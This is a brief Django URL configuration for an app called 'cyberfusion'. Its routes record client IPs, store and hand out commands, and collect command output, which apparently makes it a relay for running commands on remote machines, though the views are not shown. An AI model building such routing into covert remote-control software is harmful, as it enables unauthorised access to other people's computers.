from django.urls import path
from . import views
urlpatterns = [
    path('cyberfusion/', views.index,name='index'),
    path('get_ip/', views.get_ip),
    path('', views.save_ip),
    path('get_command/', views.get_command, name='get_command'),
    path('save_command/', views.save_command),
    path('send_output/', views.send_output, name='send_output'),
    path('get_output/', views.get_output),
]
